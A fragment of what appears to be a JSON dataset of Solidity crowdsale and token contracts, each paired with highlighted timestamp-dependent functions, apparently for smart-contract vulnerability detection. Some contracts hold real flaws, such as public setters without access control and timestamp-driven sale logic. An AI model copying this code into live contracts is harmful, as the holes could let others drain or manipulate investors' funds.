stages.PRIVATE_SALE;\n weiRaised = 0;\n distributeTeam();\n distributeBounty();\n callDistributed = 7875000 * 10 ** decimals;\n callgDistributed = 1575000000 * 10 ** decimals;\n callSoftCap = 18049500 * 10 ** decimals;\n callgSoftCap = 3609900000 * 10 ** decimals;\n maxContributionPerAddress = 1500 ether;\n minInvestment = 0.01 ether;\n is_finalized = false;\n powered_up = true;\n stages_duration[uint256(stages.PRIVATE_SALE)] = 30 days;\n stages_duration[uint256(stages.PRE_SALE)] = 30 days;\n stages_duration[uint256(stages.MAIN_SALE_1)] = 7 days;\n stages_duration[uint256(stages.MAIN_SALE_2)] = 7 days;\n stages_duration[uint256(stages.MAIN_SALE_3)] = 7 days;\n stages_duration[uint256(stages.MAIN_SALE_4)] = 7 days;\n }\n function distributeTeam() public onlyOwner {\n require(!distributed_team);\n uint256 _amount = 5250000 * 10 ** decimals;\n distributed_team = true;\n MintableToken(token_call).mint(teamVault, _amount);\n MintableToken(token_callg).mint(teamVault, _amount.mul(200));\n emit TokenTransfer(msg.sender, teamVault, _amount, _amount, _amount.mul(200));\n }\n function distributeBounty() public onlyOwner {\n require(!distributed_bounty);\n uint256 _amount = 2625000 * 10 ** decimals;\n distributed_bounty = true;\n MintableToken(token_call).mint(bountyVault, _amount);\n MintableToken(token_callg).mint(bountyVault, _amount.mul(200));\n emit TokenTransfer(msg.sender, bountyVault, _amount, _amount, _amount.mul(200));\n }\n function withdrawBounty(address _beneficiary) public onlyOwner {\n require(distributed_bounty);\n bountyVault.withdrawBounty(_beneficiary);\n }\n function withdrawTeam(address _beneficiary) public onlyOwner {\n require(distributed_team);\n teamVault.withdrawTeam(_beneficiary);\n }\n function getUserContribution(address _beneficiary) public view returns (uint256) {\n return contributions[_beneficiary];\n }\n function getUserHistory(address _beneficiary) public view returns (uint256) {\n return userHistory[_beneficiary];\n }\n function getReferrals(address[] _beneficiaries) public view returns (address[], uint256[]) {\n address[] memory addrs = new address[](_beneficiaries.length);\n uint256[] memory funds = new uint256[](_beneficiaries.length);\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n addrs[i] = _beneficiaries[i];\n funds[i] = getUserHistory(_beneficiaries[i]);\n }\n return (addrs, funds);\n }\n function getAmountForCurrentStage(uint256 _amount) public view returns(uint256) {\n uint256 tokenPrice = fiat_contract.USD(0);\n if(stage == stages.PRIVATE_SALE) {\n tokenPrice = tokenPrice.mul(35).div(10 ** 8);\n } else if(stage == stages.PRE_SALE) {\n tokenPrice = tokenPrice.mul(50).div(10 ** 8);\n } else if(stage == stages.MAIN_SALE_1) {\n tokenPrice = tokenPrice.mul(70).div(10 ** 8);\n } else if(stage == stages.MAIN_SALE_2) {\n tokenPrice = tokenPrice.mul(80).div(10 ** 8);\n } else if(stage == stages.MAIN_SALE_3) {\n tokenPrice = tokenPrice.mul(90).div(10 ** 8);\n } else if(stage == stages.MAIN_SALE_4) {\n tokenPrice = tokenPrice.mul(100).div(10 ** 8);\n }\n return _amount.div(tokenPrice).mul(10 ** 10);\n }\n function _getNextStage() internal view returns (stages) {\n stages next_stage;\n if (stage == stages.PRIVATE_SALE) {\n next_stage = stages.PRE_SALE;\n } else if (stage == stages.PRE_SALE) {\n next_stage = stages.MAIN_SALE_1;\n } else if (stage == stages.MAIN_SALE_1) {\n next_stage = stages.MAIN_SALE_2;\n } else if (stage == stages.MAIN_SALE_2) {\n next_stage = stages.MAIN_SALE_3;\n } else if (stage == stages.MAIN_SALE_3) {\n next_stage = stages.MAIN_SALE_4;\n } else {\n next_stage = stages.FINALIZED;\n }\n return next_stage;\n }\n function getHardCap() public view returns (uint256, uint256) {\n uint256 hardcap_call;\n uint256 hardcap_callg;\n if (stage == stages.PRIVATE_SALE) {\n hardcap_call = 10842563;\n hardcap_callg = 2168512500;\n } else if (stage == stages.PRE_SALE) {\n hardcap_call = 18049500;\n hardcap_callg = 3609900000;\n } else if (stage == stages.MAIN_SALE_1) {\n hardcap_call = 30937200;\n hardcap_callg = 6187440000;\n } else if (stage == stages.MAIN_SALE_2) {\n hardcap_call = 40602975;\n hardcap_callg = 8120595000;\n } else if (stage == stages.MAIN_SALE_3) {\n hardcap_call = 47046825;\n hardcap_callg = 9409365000;\n } else {\n hardcap_call = 52500000;\n hardcap_callg = 10500000000;\n }\n return (hardcap_call.mul(10 ** decimals), hardcap_callg.mul(10 ** decimals));\n }\n function updateStage() public {\n _updateStage(0, 0);\n }\n function _updateStage(uint256 weiAmount, uint256 callAmount) internal {\n uint256 _duration = stages_duration[uint256(stage)];\n uint256 call_tokens = 0;\n if (weiAmount != 0) {\n call_tokens = getAmountForCurrentStage(weiAmount);\n } else {\n call_tokens = callAmount;\n }\n uint256 callg_tokens = call_tokens.mul(200);\n (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();\n if(stageStartTime.add(_duration) <= block.timestamp || callDistributed.add(call_tokens) >= _hardcapCall || callgDistributed.add(callg_tokens) >= _hardcapCallg) {\n stages next_stage = _getNextStage();\n emit StageChanged(stage, next_stage, stageStartTime);\n stage = next_stage;\n if (next_stage != stages.FINALIZED) {\n stageStartTime = block.timestamp;\n } else {\n finalization();\n }\n }\n }\n function buyTokens(address _beneficiary) public payable {\n require(!is_finalized);\n if (_beneficiary == address(0)) {\n _beneficiary = msg.sender;\n }\n (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();\n uint256 weiAmount = msg.value;\n require(weiAmount > 0);\n require(_beneficiary != address(0));\n require(weiAmount >= minInvestment);\n require(contributions[_beneficiary].add(weiAmount) <= maxContributionPerAddress);\n _updateStage(weiAmount, 0);\n uint256 call_tokens = getAmountForCurrentStage(weiAmount);\n uint256 callg_tokens = call_tokens.mul(200);\n weiRaised = weiRaised.add(weiAmount);\n callDistributed = callDistributed.add(call_tokens);\n callgDistributed = callgDistributed.add(callg_tokens);\n MintableToken(token_call).mint(_beneficiary, call_tokens);\n MintableToken(token_callg).mint(_beneficiary, callg_tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, call_tokens, callg_tokens);\n contributions[_beneficiary] = contributions[_beneficiary].add(weiAmount);\n userHistory[_beneficiary] = userHistory[_beneficiary].add(call_tokens);\n vault.deposit.value(msg.value)(msg.sender);\n }\n function finalize() onlyOwner public {\n stage = stages.FINALIZED;\n finalization();\n }\n function extendPeriod(uint256 date) public onlyOwner {\n stages_duration[uint256(stage)] = stages_duration[uint256(stage)].add(date);\n }\n function transferTokens(address _to, uint256 _amount) public onlyOwner {\n require(!is_finalized);\n require(_to != address(0));\n require(_amount > 0);\n _updateStage(0, _amount);\n callDistributed = callDistributed.add(_amount);\n callgDistributed = callgDistributed.add(_amount.mul(200));\n if (stage == stages.FINALIZED) {\n (uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();\n require(callDistributed.add(callDistributed) <= _hardcapCall);\n require(callgDistributed.add(callgDistributed) <= _hardcapCallg);\n }\n MintableToken(token_call).mint(_to, _amount);\n MintableToken(token_callg).mint(_to, _amount.mul(200));\n userHistory[_to] = userHistory[_to].add(_amount);\n emit TokenTransfer(msg.sender, _to, _amount, _amount, _amount.mul(200));\n }\n function claimRefund() public {\n address _beneficiary = msg.sender;\n require(is_finalized);\n require(!goalReached());\n userHistory[_beneficiary] = 0;\n vault.refund(_beneficiary);\n }\n function goalReached() public view returns (bool) {\n if (callDistributed >= callSoftCap && callgDistributed >= callgSoftCap) {\n return true;\n } else {\n return false;\n }\n }\n function finishMinting() public onlyOwner {\n MintableToken(token_call).finishMinting();\n MintableToken(token_callg).finishMinting();\n }\n function finalization() internal {\n require(!is_finalized);\n is_finalized = true;\n finishMinting();\n emit Finalized(callDistributed, callgDistributed);\n if (goalReached()) {\n emit GoalReached(callSoftCap, callgSoftCap);\n vault.close();\n } else {\n vault.enableRefunds();\n }\n }\n}",
  "extract_feature": [
    "function powerUpContract() public onlyOwner {\nrequire(!powered_up);\nrequire(!is_finalized);\nstageStartTime = block.timestamp;\nstage = stages.PRIVATE_SALE;\nweiRaised = 0;\ndistributeTeam();\ndistributeBounty();\ncallDistributed = 7875000 * 10 ** decimals;\ncallgDistributed = 1575000000 * 10 ** decimals;\ncallSoftCap = 18049500 * 10 ** decimals;\ncallgSoftCap = 3609900000 * 10 ** decimals;\nmaxContributionPerAddress = 1500 ether;\nminInvestment = 0.01 ether;\nis_finalized = false;\npowered_up = true;\nstages_duration[uint256(stages.PRIVATE_SALE)] = 30 days;\nstages_duration[uint256(stages.PRE_SALE)] = 30 days;\nstages_duration[uint256(stages.MAIN_SALE_1)] = 7 days;\nstages_duration[uint256(stages.MAIN_SALE_2)] = 7 days;\nstages_duration[uint256(stages.MAIN_SALE_3)] = 7 days;\nstages_duration[uint256(stages.MAIN_SALE_4)] = 7 days;\n}",
    "function _updateStage(uint256 weiAmount, uint256 callAmount) internal {\nuint256 _duration = stages_duration[uint256(stage)];\nuint256 call_tokens = 0;\nif (weiAmount != 0) {\ncall_tokens = getAmountForCurrentStage(weiAmount);\n} else {\ncall_tokens = callAmount;\n}\nuint256 callg_tokens = call_tokens.mul(200);\n(uint256 _hardcapCall, uint256 _hardcapCallg) = getHardCap();\nif(stageStartTime.add(_duration) <= block.timestamp || callDistributed.add(call_tokens) >= _hardcapCall || callgDistributed.add(callg_tokens) >= _hardcapCallg) {\nstages next_stage = _getNextStage();\nemit StageChanged(stage, next_stage, stageStartTime);\nstage = next_stage;\nif (next_stage != stages.FINALIZED) {\nstageStartTime = block.timestamp;\n} else {\nfinalization();\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f49"
  },
  "filename": "7828.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract TokenlessCrowdsale {\n using SafeMath for uint256;\n address public wallet;\n uint256 public weiRaised;\n event SaleContribution(address indexed purchaser, address indexed beneficiary, uint256 value);\n constructor (address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchaseInWei(_beneficiary, weiAmount);\n emit SaleContribution(\n msg.sender,\n _beneficiary,\n weiAmount\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract WhitelistedAICrowdsale is TokenlessCrowdsale, Ownable {\n using SafeMath for uint256;\n mapping(address => bool) public accredited;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public caps;\n function isWhitelisted(address _beneficiary) public view returns (bool) {\n if (caps[_beneficiary] != 0) {\n return true;\n }\n return false;\n }\n function addToWhitelist(address _beneficiary, uint256 _cap, bool _accredited) external onlyOwner {\n caps[_beneficiary] = _cap;\n accredited[_beneficiary] = _accredited;\n }\n function removeFromWhitelist(address _beneficiary) external onlyOwner {\n caps[_beneficiary] = 0;\n accredited[_beneficiary] = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n super._updatePurchasingState(_beneficiary, _weiAmount);\n contributions[_beneficiary] = contributions[_beneficiary].add(_weiAmount);\n }\n}\ncontract FiatCappedCrowdsale is TokenlessCrowdsale, Ownable {\n using SafeMath for uint256;\n uint256 public millCap;\n uint256 public millRaised;\n uint256 public minMillPurchase;\n uint256 public millWeiRate;\n uint256 public millLeconteRate;\n uint256 constant minMillWeiRate = (10 ** 18) / (5000 * (10 ** 3));\n uint256 constant maxMillWeiRate = (10 ** 18) / (100 * (10 ** 3));\n uint256 constant minMillLeconteRate = (10 ** 18) / 1000;\n uint256 constant maxMillLeconteRate = (10 ** 18) / 10;\n modifier isSaneETHRate(uint256 _millWeiRate) {\n require(_millWeiRate >= minMillWeiRate);\n require(_millWeiRate <= maxMillWeiRate);\n _;\n }\n modifier isSaneSPXRate(uint256 _millLeconteRate) {\n require(_millLeconteRate >= minMillLeconteRate);\n require(_millLeconteRate <= maxMillLeconteRate);\n _;\n }\n constructor (\n uint256 _millCap,\n uint256 _minMillPurchase,\n uint256 _millLeconteRate,\n uint256 _millWeiRate\n ) public isSaneSPXRate(_millLeconteRate) isSaneETHRate(_millWeiRate) {\n require(_millCap > 0);\n require(_minMillPurchase > 0);\n millCap = _millCap;\n minMillPurchase = _minMillPurchase;\n millLeconteRate = _millLeconteRate;\n millWeiRate = _millWeiRate;\n }\n function capReached() public view returns (bool) {\n return millRaised >= millCap;\n }\n function setWeiRate(uint256 _millWeiRate) external onlyOwner isSaneETHRate(_millWeiRate) {\n millWeiRate = _millWeiRate;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n uint256 _millAmount = _toMill(_weiAmount);\n require(_millAmount >= minMillPurchase);\n uint256 _millRaised = millRaised.add(_millAmount);\n require(_millRaised <= millCap);\n millRaised = _millRaised;\n }\n function _toMill(uint256 _weiAmount) internal returns (uint256) {\n return _weiAmount.div(millWeiRate);\n }\n function _toLeconte(uint256 _weiAmount) internal returns (uint256) {\n return _toMill(_weiAmount).mul(millLeconteRate);\n }\n}\ncontract PausableCrowdsale is TokenlessCrowdsale, Ownable {\n bool public open = true;\n modifier saleIsOpen() {\n require(open);\n _;\n }\n function unpauseSale() external onlyOwner {\n require(!open);\n open = true;\n }\n function pauseSale() external onlyOwner saleIsOpen {\n open = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal saleIsOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BasicERC223Receiver {\n function tokenFallback(address _from, uint256 _value, bytes _data) public pure;\n}\ncontract RestrictedToken is BasicToken, Ownable {\n string public name;\n string public symbol;\n uint8 public decimals;\n address public issuer;\n uint256 public vestingPeriod;\n mapping(address => bool) public authorizedRecipients;\n mapping(address => bool) public erc223Recipients;\n mapping(address => uint256) public lastIssuedTime;\n event Issue(address indexed to, uint256 value);\n modifier onlyIssuer() {\n require(msg.sender == issuer);\n _;\n }\n modifier isAuthorizedRecipient(address _recipient) {\n require(authorizedRecipients[_recipient]);\n _;\n }\n constructor (\n uint256 _supply,\n string _name,\n string _symbol,\n uint8 _decimals,\n uint256 _vestingPeriod,\n address _owner,\n address _issuer\n ) public {\n require(_supply != 0);\n require(_owner != address(0));\n require(_issuer != address(0));\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n vestingPeriod = _vestingPeriod;\n owner = _owner;\n issuer = _issuer;\n totalSupply_ = _supply;\n balances[_issuer] = _supply;\n emit Transfer(address(0), _issuer, _supply);\n }\n function authorize(address _recipient, bool _isERC223) public onlyOwner {\n require(_recipient != address(0));\n authorizedRecipients[_recipient] = true;\n erc223Recipients[_recipient] = _isERC223;\n }\n function deauthorize(address _recipient) public onlyOwner isAuthorizedRecipient(_recipient) {\n authorizedRecipients[_recipient] = false;\n erc223Recipients[_recipient] = false;\n }\n function transfer(address _to, uint256 _value) public isAuthorizedRecipient(_to) returns (bool) {\n if (erc223Recipients[_to]) {\n BasicERC223Receiver receiver = BasicERC223Receiver(_to);\n bytes memory empty;\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n return super.transfer(_to, _value);\n }\n function issue(address _to, uint256 _value) public onlyIssuer returns (bool) {\n lastIssuedTime[_to] = block.timestamp;\n emit Issue(_to, _value);\n return super.transfer(_to, _value);\n }\n}\ncontract PrivatePreSale is TokenlessCrowdsale, WhitelistedAICrowdsale, FiatCappedCrowdsale, PausableCrowdsale {\n using SafeMath for uint256;\n RestrictedToken public tokenR0;\n RestrictedToken public tokenR6;\n uint8 constant bonusPct = 15;\n constructor (address _wallet, uint256 _millWeiRate) TokenlessCrowdsale(_wallet)\n FiatCappedCrowdsale(\n 5000000 * (10 ** 3),\n 500 * (10 ** 3),\n (10 ** 18) / 50,\n _millWeiRate\n )\n public {\n tokenR0 = new RestrictedToken(\n 2 * 100000000 * (10 ** 18),\n 'Sparrow Token (Restricted)',\n 'SPX-R0',\n 18,\n 0,\n msg.sender,\n this\n );\n tokenR6 = new RestrictedToken(\n 2 * 115000000 * (10 ** 18),\n 'Sparrow Token (Restricted with 6-month vesting)',\n 'SPX-R6',\n 18,\n 6 * 30 * 86400,\n msg.sender,\n this\n );\n }\n function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {\n super._processPurchaseInWei(_beneficiary, _weiAmount);\n uint256 tokens = _toLeconte(_weiAmount);\n uint256 bonus = tokens.mul(bonusPct).div(100);\n if (accredited[_beneficiary]) {\n tokenR0.issue(_beneficiary, tokens);\n tokenR6.issue(_beneficiary, bonus);\n } else {\n tokenR6.issue(_beneficiary, tokens.add(bonus));\n }\n }\n}",
  "extract_feature": [
    "function issue(address _to, uint256 _value) public onlyIssuer returns (bool) {\nlastIssuedTime[_to] = block.timestamp;\nemit Issue(_to, _value);\nreturn super.transfer(_to, _value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4a"
  },
  "filename": "7877.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary AddressExtension {\n function isValid(address _address) internal pure returns (bool) {\n return 0 != _address;\n }\n function isAccount(address _address) internal view returns (bool result) {\n assembly {\n result := iszero(extcodesize(_address))\n }\n }\n function toBytes(address _address) internal pure returns (bytes b) {\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address))\n mstore(0x40, add(m, 52))\n b := m\n }\n }\n}\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKAuthority {\n function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);\n function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);\n function validate() public pure returns (bytes4);\n}\ncontract Authorizable {\n event SetFsTKAuthority(FsTKAuthority indexed _address);\n modifier onlyFsTKAuthorized {\n require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));\n _;\n }\n modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {\n require(fstkAuthority.isApproved(hash, approveTime, approveToken));\n _;\n }\n FsTKAuthority internal fstkAuthority;\n constructor(FsTKAuthority _fstkAuthority) internal {\n fstkAuthority = _fstkAuthority;\n }\n function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {\n require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);\n emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);\n }\n}\ncontract IssuerContract {\n using AddressExtension for address;\n event SetIssuer(address indexed _address);\n modifier onlyIssuer {\n require(issuer == msg.sender);\n _;\n }\n address public issuer;\n address public newIssuer;\n constructor(address _issuer) internal {\n issuer = _issuer;\n }\n function setIssuer(address _address) public onlyIssuer {\n newIssuer = _address;\n }\n function confirmSetIssuer() public {\n require(newIssuer == msg.sender);\n emit SetIssuer(issuer = newIssuer);\n delete newIssuer;\n }\n}\ncontract ERC20 {\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public view returns (uint256);\n function allowance(address owner, address spender) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n}\ncontract SecureERC20 is ERC20 {\n event SetERC20ApproveChecking(bool approveChecking);\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);\n function increaseAllowance(address spender, uint256 value) public returns (bool);\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);\n function setERC20ApproveChecking(bool approveChecking) public;\n}\ncontract FsTKToken {\n event Consume(address indexed from, uint256 value, bytes32 challenge);\n event IncreaseNonce(address indexed from, uint256 nonce);\n event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);\n event TerminateDirectDebit(address indexed debtor, address indexed receiver);\n event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);\n event SetMetadata(string metadata);\n event SetLiquid(bool liquidity);\n event SetDelegate(bool isDelegateEnable);\n event SetDirectDebit(bool isDirectDebitEnable);\n struct DirectDebitInfo {\n uint256 amount;\n uint256 startTime;\n uint256 interval;\n }\n struct DirectDebit {\n DirectDebitInfo info;\n uint256 epoch;\n }\n struct Instrument {\n uint256 allowance;\n DirectDebit directDebit;\n }\n struct Account {\n uint256 balance;\n uint256 nonce;\n mapping (address => Instrument) instruments;\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256);\n function transfer(uint256[] data) public returns (bool);\n function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);\n function nonceOf(address owner) public view returns (uint256);\n function increaseNonce() public returns (bool);\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) public returns (bool);\n function directDebit(address debtor, address receiver) public view returns (DirectDebit);\n function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);\n function terminateDirectDebit(address receiver) public returns (bool);\n function withdrawDirectDebit(address debtor) public returns (bool);\n function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);\n}\ncontract ERC20Like is SecureERC20, FsTKToken {\n using AddressExtension for address;\n using Math for uint256;\n modifier liquid {\n require(isLiquid);\n _;\n }\n modifier canUseDirectDebit {\n require(isDirectDebitEnable);\n _;\n }\n modifier canDelegate {\n require(isDelegateEnable);\n _;\n }\n modifier notThis(address _address) {\n require(_address != address(this));\n _;\n }\n bool public erc20ApproveChecking;\n bool public isLiquid = true;\n bool public isDelegateEnable;\n bool public isDirectDebitEnable;\n string public metadata;\n mapping(address => Account) internal accounts;\n constructor(string _metadata) public {\n metadata = _metadata;\n }\n function balanceOf(address owner) public view returns (uint256) {\n return accounts[owner].balance;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return accounts[owner].instruments[spender].allowance;\n }\n function transfer(address to, uint256 value) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n senderAccount.balance = senderAccount.balance.sub(value);\n accounts[to].balance += value;\n emit Transfer(msg.sender, to, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {\n Account storage fromAccount = accounts[from];\n Instrument storage senderInstrument = fromAccount.instruments[msg.sender];\n fromAccount.balance = fromAccount.balance.sub(value);\n senderInstrument.allowance = senderInstrument.allowance.sub(value);\n accounts[to].balance += value;\n emit Transfer(from, to, value);\n return true;\n }\n function approve(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n if (erc20ApproveChecking) {\n require((value == 0) || (spenderInstrument.allowance == 0));\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = value\n );\n return true;\n }\n function setERC20ApproveChecking(bool approveChecking) public {\n emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);\n }\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n require(spenderInstrument.allowance == expectedValue);\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function increaseAllowance(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = spenderInstrument.allowance.add(value)\n );\n return true;\n }\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n uint256 currentValue = spenderInstrument.allowance;\n uint256 newValue;\n if (strict) {\n newValue = currentValue.sub(value);\n } else if (value < currentValue) {\n newValue = currentValue - value;\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function setMetadata0(string _metadata) internal {\n emit SetMetadata(metadata = _metadata);\n }\n function setLiquid0(bool liquidity) internal {\n emit SetLiquid(isLiquid = liquidity);\n }\n function setDelegate(bool delegate) public {\n emit SetDelegate(isDelegateEnable = delegate);\n }\n function setDirectDebit(bool directDebit) public {\n emit SetDirectDebit(isDirectDebitEnable = directDebit);\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256) {\n Account storage ownerAccount = accounts[owner];\n return Math.min(\n ownerAccount.instruments[spender].allowance,\n ownerAccount.balance\n );\n }\n function transfer(uint256[] data) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n uint256 totalValue;\n for (uint256 i = 0; i < data.length; i++) {\n address receiver = address(data[i] >> 96);\n uint256 value = data[i] & 0xffffffffffffffffffffffff;\n totalValue = totalValue.add(value);\n accounts[receiver].balance += value;\n emit Transfer(msg.sender, receiver, value);\n }\n senderAccount.balance = senderAccount.balance.sub(totalValue);\n return true;\n }\n function transferAndCall(\n address to,\n uint256 value,\n bytes data\n )\n public\n payable\n liquid\n notThis(to)\n returns (bool)\n {\n require(\n transfer(to, value) &&\n data.length >= 68\n );\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), caller)\n }\n require(to.call.value(msg.value)(data));\n return true;\n }\n function nonceOf(address owner) public view returns (uint256) {\n return accounts[owner].nonce;\n }\n function increaseNonce() public returns (bool) {\n emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);\n }\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n public\n liquid\n canDelegate\n notThis(to)\n returns (bool)\n {\n address signer = ecrecover(\n 